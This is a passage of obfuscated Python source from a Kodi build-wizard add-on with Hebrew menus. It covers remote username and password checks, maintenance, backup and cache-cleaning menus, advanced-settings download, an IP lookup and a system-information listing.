	if not YOUTUBEFILE =='http://':#line:2425
		if url ==None :#line:2426
			OOO0OO00O0OO0O00O =wiz .workingURL (YOUTUBEFILE )#line:2427
			O0OOOO0000OO0OO00 =uservar .YOUTUBEFILE #line:2428
		else :#line:2429
			OOO0OO00O0OO0O00O =wiz .workingURL (url )#line:2430
			O0OOOO0000OO0OO00 =url #line:2431
		if OOO0OO00O0OO0O00O ==True :#line:2432
			OO00OO00O0000OO0O =wiz .openURL (O0OOOO0000OO0OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2433
			OO0O0OOO000OO00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO00OO00O0000OO0O )#line:2434
			if len (OO0O0OOO000OO00OO )>0 :#line:2435
				for OOO0O000O000O0O00 ,OOOO0O00OOOOO0O00 ,url ,OOOO00O00O0O000OO ,OOOO000O0O000O0OO ,OO0000OOO0O000OO0 in OO0O0OOO000OO00OO :#line:2436
					if OOOO0O00OOOOO0O00 .lower ()=="yes":#line:2437
						addDir ("[B]%s[/B]"%OOO0O000O000O0O00 ,'youtube',url ,description =OO0000OOO0O000OO0 ,icon =OOOO00O00O0O000OO ,fanart =OOOO000O0O000O0OO ,themeit =THEME3 )#line:2438
					else :#line:2439
						addFile (OOO0O000O000O0O00 ,'viewVideo',url =url ,description =OO0000OOO0O000OO0 ,icon =OOOO00O00O0O000OO ,fanart =OOOO000O0O000O0OO ,themeit =THEME2 )#line:2440
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2441
		else :#line:2442
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2443
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2444
			addFile ('%s'%OOO0OO00O0OO0O00O ,'',themeit =THEME3 )#line:2445
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2446
	setView ('files','viewType')#line:2447
def STARTP ():#line:2448
	OO000O0OO0OOO00OO =(ADDON .getSetting ("pass"))#line:2449
	if BUILDNAME =="":#line:2450
	 if not NOTIFY =='true':#line:2451
          O0OOO0O0000O00OOO =wiz .workingURL (NOTIFICATION )#line:2452
	 if not NOTIFY2 =='true':#line:2453
          O0OOO0O0000O00OOO =wiz .workingURL (NOTIFICATION2 )#line:2454
	 if not NOTIFY3 =='true':#line:2455
          O0OOO0O0000O00OOO =wiz .workingURL (NOTIFICATION3 )#line:2456
	O00O0OOO0O0OOO0O0 =OO000O0OO0OOO00OO #line:2457
	O0OOO0O0000O00OOO =urllib2 .Request (SPEED )#line:2458
	O00OO0OO00O0OO0O0 =urllib2 .urlopen (O0OOO0O0000O00OOO )#line:2459
	OOO00OOOOO00OOO00 =O00OO0OO00O0OO0O0 .readlines ()#line:2461
	OOO00O0OOO0OOO000 =0 #line:2465
	for OOOOO00O0OO00O0O0 in OOO00OOOOO00OOO00 :#line:2466
		if OOOOO00O0OO00O0O0 .split (' ==')[0 ]==OO000O0OO0OOO00OO or OOOOO00O0OO00O0O0 .split ()[0 ]==OO000O0OO0OOO00OO :#line:2467
			OOO00O0OOO0OOO000 =1 #line:2468
			break #line:2469
	if OOO00O0OOO0OOO000 ==0 :#line:2470
					O0O00OO0O0OO00000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2471
					if O0O00OO0O0OO00000 :#line:2473
						ADDON .openSettings ()#line:2475
						STARTP ()#line:2476
						sys .exit ()#line:2477
					else :#line:2478
						sys .exit ()#line:2479
	return 'ok'#line:2483
def STARTP2 ():#line:2484
	O000O00O0O0OOO00O =(ADDON .getSetting ("user"))#line:2485
	OOO00OO0OOOO0OOO0 =(UNAME )#line:2487
	OOO0O0OOOOO0OOOO0 =urllib2 .urlopen (OOO00OO0OOOO0OOO0 )#line:2488
	O00OO00O000O0OO0O =OOO0O0OOOOO0OOOO0 .readlines ()#line:2489
	OOOO00O00OOO00O00 =0 #line:2490
	for O00O0OOO000OO00OO in O00OO00O000O0OO0O :#line:2493
		if O00O0OOO000OO00OO .split (' ==')[0 ]==O000O00O0O0OOO00O or O00O0OOO000OO00OO .split ()[0 ]==O000O00O0O0OOO00O :#line:2494
			OOOO00O00OOO00O00 =1 #line:2495
			break #line:2496
	if OOOO00O00OOO00O00 ==0 :#line:2497
		OOO0OOOOOOOOOO00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2498
		if OOO0OOOOOOOOOO00O :#line:2500
			ADDON .openSettings ()#line:2502
			STARTP2 ()#line:2504
			sys .exit ()#line:2505
		else :#line:2506
			sys .exit ()#line:2507
	return 'ok'#line:2511
def passandpin ():#line:2512
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2513
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2514
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2515
def passandUsername ():#line:2516
	ADDON .openSettings ()#line:2517
def folderback ():#line:2520
    OOO00OO0OO0O00O0O =ADDON .getSetting ("path")#line:2521
    if OOO00OO0OO0O00O0O :#line:2522
      OOO00OO0OO0O00O0O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2523
      ADDON .setSetting ("path",OOO00OO0OO0O00O0O )#line:2524
def backmyupbuild ():#line:2527
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2539
def maintMenu (view =None ):#line:2543
	OOO00O0O0O000O0O0 ='[B][COLOR green]ON[/COLOR][/B]';O0O0OO00OO00OO00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2545
	O00O0OOOO0O0O0O00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2546
	OO0O0OOO00O00O0OO ='true'if AUTOCACHE =='true'else 'false'#line:2547
	OO00OO00O00OOOOOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2548
	OOOOOOO000OO00000 ='true'if AUTOTHUMBS =='true'else 'false'#line:2549
	O0O0OO000O0O0O000 ='true'if SHOWMAINT =='true'else 'false'#line:2550
	OOOOOOO0OOO00O000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2551
	O0OOOOOOOO000OO0O ='true'if INCLUDEALL =='true'else 'false'#line:2552
	O0000OOOO0OOO0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2553
	if wiz .Grab_Log (True )==False :OOO0O00O0OO0O000O =0 #line:2554
	else :OOO0O00O0OO0O000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2555
	if wiz .Grab_Log (True ,True )==False :O0O0OO00OOOOO000O =0 #line:2556
	else :O0O0OO00OOOOO000O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2557
	O00O00O000OOO0O00 =int (OOO0O00O0OO0O000O )+int (O0O0OO00OOOOO000O )#line:2558
	OO000OO0OOOOO0OOO =str (O00O00O000OOO0O00 )+' Error(s) Found'if O00O00O000OOO0O00 >0 else 'None Found'#line:2559
	OOOOO0OO00O0O0000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2560
	if O0OOOOOOOO000OO0O =='true':#line:2561
		O00O000O00OOOO000 ='true'#line:2562
		OOOO00O0O000O000O ='true'#line:2563
		O0O0OO0OOO000000O ='true'#line:2564
		O0000OO000OOO0000 ='true'#line:2565
		O0OO000O00OO0O00O ='true'#line:2566
		O0O0O0OOOO0O0OOO0 ='true'#line:2567
		OOO0O000OOO00000O ='true'#line:2568
		OO0O0O000000OOOO0 ='true'#line:2569
	else :#line:2570
		O00O000O00OOOO000 ='true'if INCLUDEBOB =='true'else 'false'#line:2571
		OOOO00O0O000O000O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2572
		O0O0OO0OOO000000O ='true'if INCLUDESPECTO =='true'else 'false'#line:2573
		O0000OO000OOO0000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2574
		O0OO000O00OO0O00O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2575
		O0O0O0OOOO0O0OOO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2576
		OOO0O000OOO00000O ='true'if INCLUDESALTS =='true'else 'false'#line:2577
		OO0O0O000000OOOO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2578
	OOO0OO00O0O0OOO0O =wiz .getSize (PACKAGES )#line:2579
	O0OOOO0O0O0OO000O =wiz .getSize (THUMBS )#line:2580
	OO0O0OO000O0O0OOO =wiz .getCacheSize ()#line:2581
	OOOO00O000O0OO0O0 =OOO0OO00O0O0OOO0O +O0OOOO0O0O0OO000O +OO0O0OO000O0O0OOO #line:2582
	O0000OOOOO0OOOO00 =['Daily','Always','3 Days','Weekly']#line:2583
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2584
	if view =="clean"or SHOWMAINT =='true':#line:2585
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO00O000O0OO0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OO000O0O0OOO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OO00O0O0OOO0O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOOO0O0O0OO000O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2593
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2594
	if view =="addon"or SHOWMAINT =='false':#line:2595
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2602
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2603
	if view =="misc"or SHOWMAINT =='true':#line:2604
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('View Errors in Log: %s'%(OO000OO0OOOOO0OOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('Clear Wizard Log File%s'%OOOOO0OO00O0O0000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2613
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2614
	if view =="backup"or SHOWMAINT =='true':#line:2615
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2626
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2627
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2628
	if view =="tweaks"or SHOWMAINT =='true':#line:2629
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2630
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		else :#line:2632
			if os .path .exists (ADVANCED ):#line:2633
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2634
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2635
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2642
	addFile ('Show All Maintenance: %s'%O0O0OO000O0O0O000 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2643
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2644
	addFile ('Third Party Wizards: %s'%O0000OOOO0OOO0OOO .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2645
	if O0000OOOO0OOO0OOO =='true':#line:2646
		O0000000OO0O0000O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2647
		OOOO0OO0OOO0O0OOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2648
		O0O0OOOO0O0OO00OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2649
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000000OO0O0000O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO0OO0OOO0O0OOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2651
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0OOOO0O0OO00OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2652
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2653
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00O0OOOO0O0O0O00 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2654
	if O00O0OOOO0O0O0O00 =='true':#line:2655
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0000OOOOO0OOOO00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0O0OOO00O00O0OO .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00OO00O00OOOOOO .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2658
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOOOOO000OO00000 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2659
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2660
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOOOO0OOO00O000 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2661
	if OOOOOOO0OOO00O000 =='true':#line:2662
		addFile ('--- Include All Video Addons: %s'%O0OOOOOOOO000OO0O .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Bob: %s'%O00O000O00OOOO000 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Phoenix: %s'%OOOO00O0O000O000O .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include Specto: %s'%O0O0OO0OOO000000O .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Exodus: %s'%O0OO000O00OO0O00O .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Include Salts: %s'%OOO0O000OOO00000O .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Include Salts HD Lite: %s'%OO0O0O000000OOOO0 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('--- Include One Channel: %s'%O0O0O0OOOO0O0OOO0 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('--- Include Genesis: %s'%O0000OO000OOO0000 .replace ('true',OOO00O0O0O000O0O0 ).replace ('false',O0O0OO00OO00OO00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2672
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2673
	setView ('files','viewType')#line:2674
def advancedWindow (url =None ):#line:2676
	if not ADVANCEDFILE =='http://':#line:2677
		if url ==None :#line:2678
			OO0O00000OOO00OO0 =wiz .workingURL (ADVANCEDFILE )#line:2679
			OO000OOOO000OO000 =uservar .ADVANCEDFILE #line:2680
		else :#line:2681
			OO0O00000OOO00OO0 =wiz .workingURL (url )#line:2682
			OO000OOOO000OO000 =url #line:2683
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2684
		if os .path .exists (ADVANCED ):#line:2685
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2686
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2687
		if OO0O00000OOO00OO0 ==True :#line:2688
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2689
			OOO00OOOOOOO0O0O0 =wiz .openURL (OO000OOOO000OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2690
			OO0OO0OO00OOO0OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO00OOOOOOO0O0O0 )#line:2691
			if len (OO0OO0OO00OOO0OO0 )>0 :#line:2692
				for O000O00O00OO00OO0 ,O0000O000000OOO0O ,url ,O0O0O00O0O00O00OO ,OOOO000O0OO00000O ,OOOOOOOO0O00OOO0O in OO0OO0OO00OOO0OO0 :#line:2693
					if O0000O000000OOO0O .lower ()=="yes":#line:2694
						addDir ("[B]%s[/B]"%O000O00O00OO00OO0 ,'advancedsetting',url ,description =OOOOOOOO0O00OOO0O ,icon =O0O0O00O0O00O00OO ,fanart =OOOO000O0OO00000O ,themeit =THEME3 )#line:2695
					else :#line:2696
						addFile (O000O00O00OO00OO0 ,'writeadvanced',O000O00O00OO00OO0 ,url ,description =OOOOOOOO0O00OOO0O ,icon =O0O0O00O0O00O00OO ,fanart =OOOO000O0OO00000O ,themeit =THEME2 )#line:2697
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2698
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O00000OOO00OO0 )#line:2699
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2700
def writeAdvanced (OOO0OO00O00O00O0O ,O00OOOO0O0000000O ):#line:2702
	OOOO0OOOOO0OOO0OO =wiz .workingURL (O00OOOO0O0000000O )#line:2703
	if OOOO0OOOOO0OOO0OO ==True :#line:2704
		if os .path .exists (ADVANCED ):OOO0O000O0O0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0OO00O00O00O0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2705
		else :OOO0O000O0O0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0OO00O00O00O0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2706
		if OOO0O000O0O0O0O0O ==1 :#line:2708
			O00O0OO0O0O00000O =wiz .openURL (O00OOOO0O0000000O )#line:2709
			O00O00OO00O00OOOO =open (ADVANCED ,'w');#line:2710
			O00O00OO00O00OOOO .write (O00O0OO0O0O00000O )#line:2711
			O00O00OO00O00OOOO .close ()#line:2712
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2713
			wiz .killxbmc (True )#line:2714
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2715
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0OOOOO0OOO0OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2716
def viewAdvanced ():#line:2718
	O00O0OO0OOO0O00O0 =open (ADVANCED )#line:2719
	OO000000O0OO000O0 =O00O0OO0OOO0O00O0 .read ().replace ('\t','    ')#line:2720
	wiz .TextBox (ADDONTITLE ,OO000000O0OO000O0 )#line:2721
	O00O0OO0OOO0O00O0 .close ()#line:2722
def removeAdvanced ():#line:2724
	if os .path .exists (ADVANCED ):#line:2725
		wiz .removeFile (ADVANCED )#line:2726
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2727
def showAutoAdvanced ():#line:2729
	notify .autoConfig ()#line:2730
def getIP ():#line:2732
	O0O0OOO0O000OOO00 ='http://whatismyipaddress.com/'#line:2733
	if not wiz .workingURL (O0O0OOO0O000OOO00 ):return 'Unknown','Unknown','Unknown'#line:2734
	OO0O0OOOO0OO0000O =wiz .openURL (O0O0OOO0O000OOO00 ).replace ('\n','').replace ('\r','')#line:2735
	if not 'Access Denied'in OO0O0OOOO0OO0000O :#line:2736
		O000O0O0OO0000O00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO0O0OOOO0OO0000O )#line:2737
		O00OOO00OO0OO0O0O =O000O0O0OO0000O00 [0 ]if (len (O000O0O0OO0000O00 )>0 )else 'Unknown'#line:2738
		OO0O0OO0OOO00O000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO0O0OOOO0OO0000O )#line:2739
		OOO0OOO00000O0O0O =OO0O0OO0OOO00O000 [0 ]if (len (OO0O0OO0OOO00O000 )>0 )else 'Unknown'#line:2740
		O00OOO000000O00OO =OO0O0OO0OOO00O000 [1 ]+', '+OO0O0OO0OOO00O000 [2 ]+', '+OO0O0OO0OOO00O000 [3 ]if (len (OO0O0OO0OOO00O000 )>2 )else 'Unknown'#line:2741
		return O00OOO00OO0OO0O0O ,OOO0OOO00000O0O0O ,O00OOO000000O00OO #line:2742
	else :return 'Unknown','Unknown','Unknown'#line:2743
def systemInfo ():#line:2745
	OOO00O0OOOOO0OO0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2759
	OOO0O0O00OOOOOO0O =[];O0O00O0O00OOO00OO =0 #line:2760
	for O0O00OOOO0O0O00O0 in OOO00O0OOOOO0OO0O :#line:2761
		O0O00OO00OOO0O00O =wiz .getInfo (O0O00OOOO0O0O00O0 )#line:2762
		O0000OOO00OOOO0O0 =0 #line:2763
		while O0O00OO00OOO0O00O =="Busy"and O0000OOO00OOOO0O0 <10 :#line:2764
			O0O00OO00OOO0O00O =wiz .getInfo (O0O00OOOO0O0O00O0 );O0000OOO00OOOO0O0 +=1 ;wiz .log ("%s sleep %s"%(O0O00OOOO0O0O00O0 ,str (O0000OOO00OOOO0O0 )));xbmc .sleep (1000 )#line:2765
		OOO0O0O00OOOOOO0O .append (O0O00OO00OOO0O00O )#line:2766
		O0O00O0O00OOO00OO +=1 #line:2767
